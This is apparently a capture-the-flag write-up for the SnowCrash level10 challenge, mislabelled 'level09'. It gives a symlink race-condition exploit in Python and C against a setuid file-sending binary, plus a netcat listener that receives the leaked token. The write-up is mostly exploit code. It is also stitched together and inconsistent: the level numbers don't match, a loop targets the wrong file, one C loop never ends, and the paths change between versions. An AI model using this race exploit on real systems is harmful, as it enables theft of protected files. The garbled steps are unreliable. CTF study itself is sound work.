# level09
## Introduction

...

## Observations

```bash
level10@SnowCrash:~$ ls
level10  token


level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

level10@SnowCrash:~$ ltrace ./level10 
__libc_start_main(0x80486d4, 1, 0xbffff6e4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
	sends file to host if you have access to it
) = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

level10@SnowCrash:~$ ./level10 ./token 192.168.219.137
You don't have access to ./token
level10@SnowCrash:~$ touch /tmp/smt
level10@SnowCrash:~$ ./level10 /tmp/smt 192.168.219.137
Connecting to 192.168.219.137:6969 .. Unable to connect to host 192.168.219.137


```




## Final solution
### Get the token

```python
#!/usr/bin/env python2
import os
import time

dummy_file = "/tmp/dum"
symlink_path = "/tmp/sym"
token_path = os.path.expanduser("~/token")

# Make sure the dummy file exists
if not os.path.exists(dummy_file):
    with open(dummy_file, "w") as f:
        f.write("dummy")
    os.chmod(dummy_file, 0777)  # Full permissions

while True:
    try:
        # Point to dummy file first
        if os.path.islink(symlink_path) or os.path.exists(symlink_path):
            os.remove(symlink_path)
        os.symlink(dummy_file, symlink_path)

        # Quickly replace it with link to token file
        os.remove(symlink_path)
        os.symlink(token_path, symlink_path)

        # Remove again to restart loop cleanly
        os.remove(symlink_path)
    except Exception as e:
        pass  # Ignore errors (e.g., file not found between checks)
```

```bash
touch /tmp/dum
chmod 777 /tmp/dum
chmod +x /tmp/exploit.py
```

```bash
while true; do ./level10 /tmp/dum 192.168.219.137; done
```

```bash
nc -k -l 6969
```

```bash
level10@SnowCrash:~$ vi /tmp/exploit.py
level10@SnowCrash:~$ cat /tmp/exploit.py
#!/usr/bin/env python2
import os
import time

dummy_file = "/tmp/dum"
symlink_path = "/tmp/sym"
token_path = os.path.expanduser("~/token")

# Make sure the dummy file exists
if not os.path.exists(dummy_file):
    with open(dummy_file, "w") as f:
        f.write("dummy")
    os.chmod(dummy_file, 0777)  # Full permissions

while True:
    try:
        # Point to dummy file first
        if os.path.islink(symlink_path) or os.path.exists(symlink_path):
            os.remove(symlink_path)
        os.symlink(dummy_file, symlink_path)

        # Quickly replace it with link to token file
        os.remove(symlink_path)
        os.symlink(token_path, symlink_path)

        # Remove again to restart loop cleanly
        os.remove(symlink_path)
    except Exception as e:
        pass  # Ignore errors (e.g., file not found between checks)

```

```C
void main()
{
	int i = 10000;
	while(i)
	{
		system("ln -s /tmp/dum /tmp/sym");
		system("rm -rf /tmp/sym");
		system("ln -s ~/token /tmp/sym");
		system("rm -rf /tmp/sym");
	}
}
```
```bash
level10@SnowCrash:~$ vi /tmp/exploit.c
level10@SnowCrash:~$ cat /tmp/exploit.c
```
```c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define DUMMY "/tmp/tmp/dum"
#define SYMLINK "/tmp/tmp/sym"
#define TARGET "/home/user/token"  // replace with full path to token
#define BINARY "/home/user/level10/level10"
#define HOST "192.168.219.137"

void race_symlink() {
    while (1) {
        unlink(SYMLINK);

        if (symlink(DUMMY, SYMLINK) == -1) {
            perror("symlink to dummy");
        }

        unlink(SYMLINK);

        if (symlink(TARGET, SYMLINK) == -1) {
            perror("symlink to token");
        }

        unlink(SYMLINK);
    }
}

void run_binary() {
    char *args[] = {BINARY, SYMLINK, HOST, NULL};
    while (1) {
        execv(BINARY, args);
    }
}

int main() {

    char *args[] = {BINARY, TARGET, HOST, NULL};
    // setup_dummy();

    pid_t pid = fork();

    if (pid == 0) {
        race_symlink();
    } else if (pid > 0) {
        run_binary();
    } else {
        perror("fork");
        exit(1);
    }

    return 0;
}


```


### Get the flag
level09@SnowCrash:~$ su flag09
Password: 
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag 
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z




